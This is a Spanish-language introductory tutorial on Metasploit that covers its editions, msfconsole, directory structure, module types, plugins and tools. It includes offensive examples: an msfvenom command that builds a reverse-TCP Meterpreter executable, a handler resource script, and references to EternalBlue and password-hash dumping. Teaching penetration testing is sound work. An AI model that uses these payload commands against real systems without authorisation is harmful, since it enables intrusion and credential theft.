# Introducción a Metasploit

## 📖 ¿Qué es Metasploit?

**Metasploit Project** es una plataforma modular de pruebas de penetración basada en **Ruby** que permite a los profesionales de seguridad escribir, probar y ejecutar código de explotación de manera controlada y organizada.

### Características Principales

- **Plataforma Modular**: Arquitectura basada en componentes intercambiables
- **Lenguaje**: Desarrollado principalmente en Ruby
- **Personalización**: El código puede ser:
  - Personalizado por el usuario según necesidades específicas
  - Extraído de una base de datos con exploits modularizados actualizados constantemente

---

## 🛠️ Metasploit Framework: El Corazón del Proyecto

**Metasploit Framework** incluye un conjunto completo de herramientas diseñadas para:

### Funcionalidades Clave

1. **Probar vulnerabilidades de seguridad**
   - Verificar si un sistema es vulnerable a exploits conocidos
   - Validar parches de seguridad
   - Comprobar configuraciones inseguras

2. **Enumerar redes**
   - Descubrir hosts activos
   - Identificar servicios en ejecución
   - Mapear la topología de la red

3. **Ejecutar ataques controlados**
   - Explotación de vulnerabilidades conocidas
   - Pruebas de concepto (PoC)
   - Validación de controles de seguridad

4. **Evadir la detección**
   - Técnicas anti-IDS/IPS
   - Ofuscación de payloads
   - Evasión de antivirus

### Definición Completa

> En esencia, **Metasploit Project** es una colección de herramientas de uso común que proporciona un entorno completo para:
> - Pruebas de penetración profesionales
> - Desarrollo de exploits personalizados
> - Investigación de seguridad

---

## 🔀 Dos Versiones de Metasploit

El proyecto Metasploit se divide en dos ramas principales:

### 📊 Comparación Visual

```
METASPLOIT PROJECT
├── Metasploit Framework
│   ├── ✓ Código abierto
│   ├── ✓ Impulsado por la comunidad
│   └── ✓ Gratuito
│
└── Metasploit Pro
    ├── ✓ Uso comercial
    ├── ✓ Suscripción de pago
    └── ✓ Orientado a empresas
```

---

## 🧩 Módulos: La Esencia de Metasploit

### ¿Qué son los Módulos?

Los **módulos** mencionados son **pruebas de concepto reales** (o piezas de código reutilizables) que:

- ✅ Ya han sido desarrollados por la comunidad de seguridad
- ✅ Han sido probados en entornos reales
- ✅ Están integrados en el framework para facilitar el acceso

Un módulo en Metasploit es un componente reutilizable del framework que implementa una funcionalidad específica de seguridad, como explotación, escaneo, post-explotación o generación de payloads.

```
Metasploit = framework
Módulos = herramientas dentro del framework
```

### Propósito de los Módulos

Facilitan a los pentesters el acceso a diferentes **vectores de ataque** para:
- Diversas plataformas (Windows, Linux, macOS, etc.)
- Múltiples servicios (SSH, HTTP, SMB, FTP, etc.)
- Diferentes versiones de software

### Filosofía de Diseño

> 💡 **Metasploit NO es una herramienta multifuncional mágica**
>
> Es una **navaja suiza** con las herramientas justas para superar las vulnerabilidades más comunes sin parchear.

**Analogía práctica**: 
- ❌ No es un martillo que intenta resolver todos los problemas
- ✅ Es un kit de herramientas especializadas, cada una diseñada para un propósito específico

---

## 🎯 Ventajas Principales de Metasploit

### 1. **Gran Cantidad de Objetivos Disponibles**

- Amplia base de datos de vulnerabilidades
- Múltiples versiones de software cubiertas
- Actualizaciones constantes de la comunidad

### 2. **Acceso Rápido**

```
Usuario → Comando → Exploit → Acceso
(segundos, no horas)
```

Todo está a tan solo **unos comandos de distancia** para lograr un acceso exitoso.

### 3. **Workflow Automatizado**

El flujo de trabajo típico de Metasploit:

```
1. Seleccionar EXPLOIT
   ↓
   (Diseñado específicamente para versiones vulnerables)
   
2. Configurar PAYLOAD
   ↓
   (Se envía después del exploit exitoso)
   
3. Obtener ACCESO
   ↓
   (Control real del sistema objetivo)
```

### 4. **Gestión de Sesiones**

Metasploit proporciona una forma **sencilla y automatizada** de:
- Cambiar entre diferentes conexiones objetivo
- Mantener múltiples sesiones activas simultáneamente
- Realizar operaciones post-explotación organizadas

**Analogía**: Similar a tener múltiples pestañas abiertas en un navegador web, pero cada "pestaña" es una sesión activa en un sistema comprometido.

---

## 💼 Metasploit Pro: La Versión Comercial

**Metasploit Pro** es la versión premium que incluye características adicionales orientadas a uso empresarial y profesional.

### Características Exclusivas de Metasploit Pro

#### 🔗 **Task Chains (Cadenas de Tareas)**
- Automatización de secuencias de acciones
- Workflows complejos predefinidos
- Ahorro de tiempo en operaciones repetitivas

#### 🎭 **Social Engineering (Ingeniería Social)**
- Herramientas para campañas de phishing
- Simulación de ataques de ingeniería social
- Asistente para crear escenarios realistas

#### ✅ **Vulnerability Validations (Validaciones de Vulnerabilidad)**
- Verificación automatizada de vulnerabilidades
- Confirmación de falsos positivos
- Reportes de validación

#### 🖥️ **Graphical User Interface (Interfaz Gráfica)**
- UI amigable para usuarios menos técnicos
- Visualización de redes y ataques
- Gestión visual de sesiones

#### 🚀 **Quick Start Wizards (Asistentes de Inicio Rápido)**
- Guías paso a paso para configuración
- Plantillas pre-configuradas
- Reducción de curva de aprendizaje

#### 🔍 **Nexpose Integration (Integración con Nexpose)**
- Importación de resultados de escaneos
- Correlación de vulnerabilidades
- Explotación directa desde resultados de escaneo

### Consola de Metasploit Pro

> 📝 **Nota importante**: Si prefieres la línea de comandos, la versión Pro también contiene su propia consola, muy parecida a `msfconsole`.

---

## 📊 Tabla Comparativa: Funcionalidades de Metasploit Pro

### Categoría: INFILTRADO

| Funcionalidad | Descripción |
|---------------|-------------|
| **Explotación Manual** | Control fino sobre el proceso de explotación |
| **Evasión de Antivirus** | Técnicas para evitar detección por AV |
| **Evasión de IPS/IDS** | Bypass de sistemas de prevención/detección de intrusos |
| **Pivote Proxy** | Uso de sistemas comprometidos como proxy |
| **Post-explotación** | Acciones después de comprometer un sistema |
| **Limpieza de Sesión** | Eliminar rastros de actividad |
| **Reutilización de Credenciales** | Uso de credenciales obtenidas en otros sistemas |
| **Ingeniería Social** | Campañas de manipulación psicológica |
| **Generador de Payload** | Creación de cargas útiles personalizadas |
| **Pruebas de Penetración Rápidas** | Evaluaciones aceleradas |
| **Pivote de VPN** | Enrutamiento a través de túneles VPN |
| **Validación de Vulnerabilidades** | Verificación de exploits exitosos |
| **Asistente de Phishing** | Herramienta para campañas de phishing |
| **Pruebas de Aplicaciones Web** | Testing específico para apps web |
| **Sesiones Persistentes** | Mantener acceso a largo plazo |

### Categoría: RECOPILAR DATOS

| Funcionalidad | Descripción |
|---------------|-------------|
| **Importar y Escanear Datos** | Integración con escáneres externos |
| **Escaneos de Descubrimiento** | Identificación de hosts y servicios |
| **Metamódulos** | Módulos de análisis avanzados |
| **Integración Nexpose** | Conexión con escáner de vulnerabilidades Nexpose |

### Categoría: REMEDIAR

| Funcionalidad | Descripción |
|---------------|-------------|
| **Fuerza Bruta** | Ataques de diccionario y fuerza bruta |
| **Cadenas de Tareas** | Automatización de secuencias |
| **Flujo de Trabajo de Explotación** | Workflows organizados |
| **Repetición de Sesión** | Replay de acciones |
| **Reproducción de Tareas** | Re-ejecución de operaciones |
| **Integración Sonar del Proyecto** | Escaneo de Internet |
| **Gestión de Sesiones** | Control centralizado de conexiones |
| **Gestión de Credenciales** | Base de datos de credenciales |
| **Colaboración en Equipo** | Trabajo colaborativo multi-usuario |
| **Interfaz Web** | Acceso vía navegador |
| **Copia de Seguridad y Restauración** | Backup de configuraciones |
| **Exportación de Datos** | Exportar resultados |
| **Recopilación de Pruebas** | Documentación de evidencia |
| **Informes** | Generación de reportes profesionales |
| **Etiquetado de Datos** | Organización y categorización |

---

## 💻 Msfconsole: La Interfaz Definitiva

### ¿Qué es Msfconsole?

**msfconsole** es probablemente la interfaz más popular y poderosa para el Metasploit Framework (MSF).

### Características Principales

#### 🎯 **Consola Centralizada "Todo en Uno"**
- Acceso a todas las funcionalidades de MSF desde un solo lugar
- No necesitas cambiar entre diferentes herramientas
- Flujo de trabajo unificado

#### 🔐 **Única Forma Compatible**
> Es la **única forma compatible** de acceder a la mayoría de las funciones dentro de Metasploit

#### 🖥️ **Interfaz Basada en Consola**
- Diseñada para el Framework
- Optimizada para uso en terminal
- Scripting y automatización nativos

#### 💪 **La Más Estable y Completa**
- Contiene la **mayor cantidad de funciones**
- Es la interfaz MSF **más estable**
- Menos propensa a errores que otras interfaces

#### ⌨️ **Funcionalidades de Productividad**

```bash
# Autocompletado con TAB
msf6 > use exploit/windows/smb/[TAB]
# Muestra todos los exploits SMB disponibles

# Readline completo
msf6 > <flecha arriba> # Navegar historial
msf6 > <Ctrl+R>        # Búsqueda en historial

# Autocompletado de comandos
msf6 > se[TAB]
search  sessions  set  setg  show
```

**Características técnicas**:
- ✅ Compatibilidad total con **readline**
- ✅ **Tabulación** para autocompletado
- ✅ **Autocompletado de comandos**
- ✅ Historial de comandos navegable

#### 🔧 **Ejecución de Comandos Externos**

Puedes ejecutar comandos del sistema operativo directamente desde msfconsole:

```bash
msf6 > ls
[*] exec: ls

Desktop  Documents  Downloads  exploit.rb

msf6 > ping -c 2 192.168.1.1
[*] exec: ping -c 2 192.168.1.1

PING 192.168.1.1 (192.168.1.1) 56(84) bytes of data.
64 bytes from 192.168.1.1: icmp_seq=1 ttl=64 time=0.045 ms
```

---

## 🔌 Ecosistema Completo de Herramientas

Ambos productos (Framework y Pro) incluyen:

### 📚 **Base de Datos Extensa de Módulos**
- Miles de módulos disponibles
- Actualizaciones constantes
- Contribuciones de la comunidad global

### 🛠️ **Comandos Externos Integrados**
- **Escáneres de red**: Nmap, Nessus, Nexpose
- **Kits de ingeniería social**: SET (Social Engineering Toolkit)
- **Generadores de payload**: Venom, msfvenom
- **Herramientas de post-explotación**: Diversas utilidades

### 🎮 **Gestión de Sesiones Avanzada**

> **Analogía**: De la misma manera que vemos las **pestañas en un navegador de Internet**, podemos controlar diferentes sesiones comprometidas.

```
Tab 1: Sesión en Windows Server
Tab 2: Sesión en Linux Web Server
Tab 3: Sesión en Router
Tab 4: Sesión en Database Server
```

### 🎯 **El Concepto Clave: USABILIDAD**

> **Experiencia de Usuario (UX)**: La facilidad con la que podemos controlar la consola puede mejorar significativamente nuestra experiencia de aprendizaje.

**Beneficios de buena UX en Metasploit**:
- ⚡ Aprendizaje más rápido
- 🎯 Menos errores
- 🚀 Mayor productividad
- 💡 Mejor retención de conocimiento

---

## 🏗️ Comprender la Arquitectura

### ¿Por Qué es Importante?

> Para aprovechar al **máximo cualquier herramienta** que utilicemos, primero debemos analizar su **funcionamiento interno**.

### Ventajas de Conocer la Arquitectura

1. **Mejor comprensión** de lo que sucederá durante evaluaciones de seguridad
2. **Evitar vulnerabilidades** que puedan exponerte a ti o a tu cliente
3. **Prevenir filtraciones de datos** accidentales
4. **Uso más eficiente** de la herramienta
5. **Capacidad de troubleshooting** cuando algo falla

---

## 📂 Estructura de Directorios de Metasploit Framework

### Ubicación Principal

En distribuciones basadas en Debian (como ParrotOS Security o Kali Linux):

```bash
/usr/share/metasploit-framework/
```

Esta es la **ubicación base** donde se encuentran todos los archivos relacionados con Metasploit Framework.

---

## 📁 Carpetas Principales

### 1. **Data** (Datos)

**Propósito**: Archivos de datos utilizados por el framework

**Contenido típico**:
- Wordlists (listas de palabras para ataques de fuerza bruta)
- Plantillas de exploits
- Datos de configuración
- Bases de datos locales

**Función**: Parte funcional de la interfaz msfconsole

### 2. **Documentation** (Documentación)

**Propósito**: Documentación técnica del proyecto

**Contenido típico**:
- Guías de uso
- Referencias de API
- Detalles técnicos de módulos
- Manuales de desarrollo

**Función**: Recurso de aprendizaje y referencia

### 3. **Lib** (Library - Biblioteca)

**Propósito**: Bibliotecas de código Ruby

**Contenido típico**:
- Clases base del framework
- Funciones de utilidad
- APIs internas
- Código reutilizable

**Función**: Parte funcional de la interfaz msfconsole (el "motor" del framework)

---

## 🧩 Carpeta de Módulos

### Estructura General

```bash
/usr/share/metasploit-framework/modules/
```

**Comando para listar**:
```bash
ls /usr/share/metasploit-framework/modules
```

**Salida**:
```
auxiliary  encoders  evasion  exploits  nops  payloads  post
```

### Categorías de Módulos

#### 1️⃣ **Auxiliary** (Auxiliares)

**Propósito**: Módulos de soporte que NO explotan vulnerabilidades directamente

**Ejemplos de uso**:
- Escáneres de red
- Fuzzers (herramientas de prueba de inputs)
- Sniffers (capturadores de tráfico)
- Herramientas de enumeración
- DoS (Denegación de Servicio)

```bash
# Ejemplo de módulo auxiliary
auxiliary/scanner/smb/smb_version  # Detecta versión de SMB
```

#### 2️⃣ **Encoders** (Codificadores)

**Propósito**: Ofuscar payloads para evadir detección

**Funciones**:
- Codificar payloads maliciosos
- Evitar detección por antivirus
- Bypass de filtros de seguridad
- Eliminación de caracteres "malos" (null bytes, etc.)

```bash
# Ejemplo
encoders/x86/shikata_ga_nai  # Codificador polimórfico popular
```

#### 3️⃣ **Evasion** (Evasión)

**Propósito**: Técnicas específicas para evadir sistemas de seguridad

**Targets**:
- Antivirus
- EDR (Endpoint Detection and Response)
- Firewalls de aplicación
- Sistemas de detección de intrusos

#### 4️⃣ **Exploits** (Exploits)

**Propósito**: Código que aprovecha vulnerabilidades específicas

**Organización**: Por plataforma y servicio
```
exploits/
├── windows/
│   ├── smb/
│   ├── rdp/
│   └── http/
├── linux/
│   ├── ssh/
│   └── local/
└── multi/
    └── handler/
```

**Ejemplo**:
```bash
exploit/windows/smb/ms17_010_eternalblue  # EternalBlue exploit
```

#### 5️⃣ **NOPs** (No Operation)

**Propósito**: Generadores de instrucciones NOP (No Operation)

**Uso**:
- NOP sleds (rampas de NOPs)
- Padding en exploits de buffer overflow
- Mejorar confiabilidad de exploits

**Concepto técnico**:
```
[NOP][NOP][NOP][NOP]...[SHELLCODE]
 └─ Relleno seguro ─┘
```

#### 6️⃣ **Payloads** (Cargas Útiles)

**Propósito**: Código que se ejecuta DESPUÉS de un exploit exitoso

**Tipos**:

**Singles**: Payload completo autocontenido
```bash
payload/windows/shell_reverse_tcp
```

**Stagers**: Payload pequeño que descarga el resto
```bash
payload/windows/meterpreter/reverse_tcp
```

**Stages**: Segunda etapa descargada por el stager
```bash
payload/windows/meterpreter (stage)
```

#### 7️⃣ **Post** (Post-Explotación)

**Propósito**: Módulos para acciones DESPUÉS de comprometer un sistema

**Ejemplos de uso**:
- Recolección de información
- Escalada de privilegios
- Movimiento lateral
- Persistencia
- Extracción de credenciales
- Limpieza de logs

```bash
# Ejemplo
post/windows/gather/hashdump  # Extraer hashes de contraseñas
```

---

## 🔌 Carpeta de Plugins

### Ubicación

```bash
/usr/share/metasploit-framework/plugins/
```

### ¿Qué son los Plugins?

Los **plugins** ofrecen al pentester **mayor flexibilidad** al usar msfconsole.

### Características

- ✅ Se pueden cargar **manualmente**
- ✅ Se pueden cargar **automáticamente** según necesidad
- ✅ Proporcionan **funcionalidad adicional**
- ✅ Permiten **automatización** durante evaluaciones

### Comando para Listar Plugins

```bash
ls /usr/share/metasploit-framework/plugins/
```

### Plugins Importantes

#### 📊 **Escáneres Integrados**
```
nessus.rb      # Integración con Nessus
nexpose.rb     # Integración con Nexpose
openvas.rb     # Integración con OpenVAS
```

#### 🗄️ **Base de Datos**
```
db_credcollect.rb  # Recolección de credenciales de DB
db_tracker.rb      # Seguimiento de actividad en DB
```

#### 🔧 **Utilidades**
```
auto_add_route.rb      # Agregar rutas automáticamente
alias.rb               # Crear alias de comandos
session_notifier.rb    # Notificaciones de sesiones
session_tagger.rb      # Etiquetar sesiones
```

#### 🌐 **Red y Comunicación**
```
pcap_log.rb           # Logging de PCAP
socket_logger.rb      # Logging de sockets
msgrpc.rb            # RPC de Metasploit
```

#### 🎯 **Especializados**
```
wmap.rb              # Web application scanner
sqlmap.rb            # Integración con SQLMap
aggregator.rb        # Agregador de datos
```

### Cómo Cargar un Plugin

```bash
msf6 > load nessus
[*] Nessus Bridge for Metasploit
[*] Successfully loaded plugin: nessus
```

---

## 📜 Carpeta de Scripts

### Ubicación

```bash
/usr/share/metasploit-framework/scripts/
```

### Contenido

```bash
ls /usr/share/metasploit-framework/scripts/
```

**Salida**:
```
meterpreter  ps  resource  shell
```

### Categorías de Scripts

#### 1. **Meterpreter**
**Propósito**: Scripts para la funcionalidad de Meterpreter

**Contenido típico**:
- Scripts de post-explotación
- Automatización de tareas en Meterpreter
- Herramientas de recolección de información

**Ejemplo de uso**:
```bash
meterpreter > run post/windows/gather/enum_applications
```

#### 2. **PS** (PowerShell)
**Propósito**: Scripts relacionados con PowerShell

**Uso**: Ejecución de comandos PowerShell en targets Windows

#### 3. **Resource**
**Propósito**: Scripts de automatización para msfconsole

**Uso**: Archivos `.rc` que ejecutan secuencias de comandos

**Ejemplo**:
```bash
# Contenido de autopwn.rc
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.1.100
set LPORT 4444
exploit -j

# Ejecutar desde msfconsole
msf6 > resource autopwn.rc
```

#### 4. **Shell**
**Propósito**: Scripts útiles para shells de sistema

**Contenido**: Utilidades para shells estándar (no Meterpreter)

---

## 🛠️ Carpeta de Tools (Herramientas)

### Ubicación

```bash
/usr/share/metasploit-framework/tools/
```

### Características

**Utilidades de línea de comandos** que se pueden ejecutar:
- Directamente desde el menú de msfconsole
- Desde la terminal del sistema operativo
- Como parte de scripts automatizados

### Comando para Listar

```bash
ls /usr/share/metasploit-framework/tools/
```

**Salida**:
```
context  docs     hardware  modules   payloads
dev      exploit  memdump   password  recon
```

### Categorías de Herramientas

#### 🔍 **context**
**Propósito**: Herramientas de contexto y configuración

#### 📚 **docs**
**Propósito**: Generadores de documentación

#### 🔌 **hardware**
**Propósito**: Herramientas para hardware hacking

#### 🧩 **modules**
**Propósito**: Utilidades para gestión de módulos

#### 💣 **payloads**
**Propósito**: Generadores y manipuladores de payloads

**Herramienta principal**: `msfvenom`
```bash
# Ejemplo de msfvenom
msfvenom -p windows/meterpreter/reverse_tcp \
         LHOST=192.168.1.100 \
         LPORT=4444 \
         -f exe \
         -o payload.exe
```

#### 💻 **dev**
**Propósito**: Herramientas de desarrollo

**Uso**: Crear nuevos módulos y exploits

#### 🎯 **exploit**
**Propósito**: Utilidades relacionadas con exploits

#### 💾 **memdump**
**Propósito**: Herramientas de volcado de memoria

#### 🔐 **password**
**Propósito**: Utilidades para contraseñas

**Ejemplos**:
- Crackers de hashes
- Generadores de wordlists
- Herramientas de fuerza bruta

#### 🔭 **recon**
**Propósito**: Herramientas de reconocimiento

**Ejemplos**:
- Port scanners
- Service detection
- Banner grabbing

---

## 📝 Resumen de Ubicaciones Importantes

### Tabla de Referencia Rápida

| Carpeta | Ubicación | Propósito |
|---------|-----------|-----------|
| **Base** | `/usr/share/metasploit-framework/` | Directorio raíz |
| **Data** | `.../data/` | Datos y configuraciones |
| **Lib** | `.../lib/` | Bibliotecas de código |
| **Documentation** | `.../documentation/` | Documentación técnica |
| **Modules** | `.../modules/` | Todos los módulos (exploits, payloads, etc.) |
| **Plugins** | `.../plugins/` | Extensiones de funcionalidad |
| **Scripts** | `.../scripts/` | Scripts de automatización |
| **Tools** | `.../tools/` | Utilidades de línea de comandos |

---

## 💡 Beneficios de Conocer Estas Ubicaciones

### 1. **Consulta Rápida**
> Ahora que conocemos todas estas ubicaciones, nos resultará **fácil consultarlas** en el futuro.

### 2. **Importar Nuevos Módulos**
Cuando necesites agregar módulos personalizados:
```bash
# Copiar módulo personalizado
cp mi_exploit.rb /usr/share/metasploit-framework/modules/exploits/custom/
```

### 3. **Crear Módulos Nuevos**
Entender la estructura facilita la creación de módulos desde cero:
```ruby
# Ejemplo de estructura de un módulo exploit
class MetasploitModule < Msf::Exploit::Remote
  include Msf::Exploit::Remote::Tcp
  
  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'Mi Exploit Personalizado',
      'Description' => 'Descripción del exploit',
      # ... más configuración
    ))
  end
  
  def exploit
    # Código de explotación
  end
end
```

### 4. **Troubleshooting**
Si algo falla, sabes exactamente dónde buscar:
- ¿Problema con un módulo? → Revisar `/modules/`
- ¿Plugin no carga? → Verificar `/plugins/`
- ¿Error en script? → Examinar `/scripts/`

### 5. **Optimización**
Conocer la arquitectura permite:
- Eliminar módulos innecesarios
- Agregar funcionalidad personalizada
- Optimizar rendimiento

---

## 🎓 Conceptos Clave para Recordar

1. **Metasploit Framework** es de código abierto y gratuito
2. **Metasploit Pro** es la versión comercial con características empresariales
3. **msfconsole** es la interfaz más completa y estable
4. Los **módulos** están organizados en 7 categorías principales
5. Los **plugins** extienden la funcionalidad de msfconsole
6. Las **herramientas** son ejecutables de línea de comandos
7. Conocer la arquitectura es fundamental para uso efectivo

---

## 🚀 Próximos Pasos

En las siguientes secciones, profundizaremos en:
- Uso práctico de msfconsole
- Configuración de módulos
- Ejecución de exploits
- Gestión de sesiones
- Técnicas de post-explotación

---

## 📖 Recursos Adicionales

### Documentación Oficial
```bash
# Ver documentación local
ls /usr/share/metasploit-framework/documentation/
```

### Comunidad
- GitHub: https://github.com/rapid7/metasploit-framework
- Foros: https://github.com/rapid7/metasploit-framework/discussions
- Wiki: https://github.com/rapid7/metasploit-framework/wiki

### Comandos Útiles para Exploración

```bash
# Listar todos los exploits
ls /usr/share/metasploit-framework/modules/exploits/

# Buscar por palabra clave
grep -r "eternal" /usr/share/metasploit-framework/modules/exploits/

# Ver estructura completa
tree -L 2 /usr/share/metasploit-framework/
```

---

**¡Continuaremos profundizando en cada aspecto de Metasploit en las próximas secciones!** 🎯
